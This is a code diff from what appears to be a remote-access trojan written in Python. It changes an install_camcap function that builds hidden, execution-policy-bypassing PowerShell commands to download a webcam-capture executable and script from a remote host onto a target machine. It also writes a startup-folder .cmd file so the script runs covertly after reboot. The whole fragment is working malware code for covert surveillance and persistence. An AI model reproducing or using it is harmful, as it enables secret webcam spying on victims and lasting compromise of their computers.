@@ -186,14 +186,17 @@ def fetch_screenshot(ipv4,pword,temp_path,uname):
     print("[*] Done. Folder wiped...")
 
 def install_camcap(ipv4,pword,temp_dir,startup_dir):
-    print("[+] Downloading cam capture...")
-    camcap_download = """powershell powershell.exe -noP -ep bypass -w hidden -command \"{mkdir """+temp_dir+"""/QKlYTmHhCDy; iwr -uri """+remote_path+"""/webcam_cap/camcap.exe -outfile """+temp_dir+"""/QKlYTmHhCDy/KJUwHZlCNV.exe}\" """
+    print("[+] Downloading...")
+    camcap_download = """powershell powershell.exe -noP -ep bypass -w hidden -c \"{new-item -path """+temp_dir+"""/QKlYTmHhCDy -itemtype directory -force; iwr -uri """+remote_path+"""/webcam_cap/camcap.exe -outfile """+temp_dir+"""/QKlYTmHhCDy/KJUwHZlCNV.exe}\" """
+    print("[*] Downloaded cam caputre...")
     webcam_download = f"""powershell powershell.exe -noP -ep bypass -w hidden -c \"iwr -uri {remote_path}/webcam_cap/webcam.ps1 -outfile {temp_dir}/QKlYTmHhCDy/sjzQVatArhvlHXifK.ps1\" """
-    controller_command = f"""powershell add-content -path \\"{startup_dir}/meuqSoQyrCUvhGjpV.cmd\\" -value \\"powershell -noP -ep bypass -w hidden start-process powershell.exe -windowstyle hidden "{temp_dir}/sjzQVatArhvlHXifK.ps1" \\" """
+    print("[*] Downloaded webcam script...")
+    controller_command = f"""powershell -noP -ep bypass -w hidden add-content -path \\"{startup_dir}/meuqSoQyrCUvhGjpV.cmd\\" -value \\"powershell -noP -ep bypass -w hidden start-process powershell.exe -windowstyle hidden "{temp_dir}/sjzQVatArhvlHXifK.ps1" \\" """
+    print("[*] Downloaded controller script...")
     remote_command(ipv4,pword,camcap_download)
     remote_command(ipv4,pword,webcam_download)
     remote_command(ipv4,pword,controller_command)
-    print("[*] Downloaded cam capture...")
+    print("\n[*] Downloaded completed...")
     print("[*] Restart target host to execute...")
 
 def update():
